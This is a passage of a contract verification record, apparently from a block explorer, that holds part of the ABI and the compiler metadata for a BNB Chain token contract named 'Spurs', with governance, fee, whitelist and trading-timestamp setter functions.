rnalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pancakePair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardTokenu\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rr\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_govn\",\"type\":\"address\"}],\"name\":\"setGovernance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIscanswap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIsisfee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_swapTokensAtAmount\",\"type\":\"uint256\"}],\"name\":\"setSwapTokensAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tradingEnabledTimestamp\",\"type\":\"uint256\"}],\"name\":\"setTradingEnabledTimestamp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_a\",\"type\":\"address\"}],\"name\":\"setalladdress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"}],\"name\":\"setlpsadddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"}],\"name\":\"setrmlpsdddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"ype\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setsfee2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"}],\"name\":\"setwiteeaddress2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"sfee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabledTimestamp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userindex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"usrbuys\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"witeeArecipient\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"witeeaa\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"witeeaddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"witeelen\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Spurs", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv2", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f83011bdd605431e746cd350e9fdcba5bc74628a11b28948d7c071aa129ddac1"}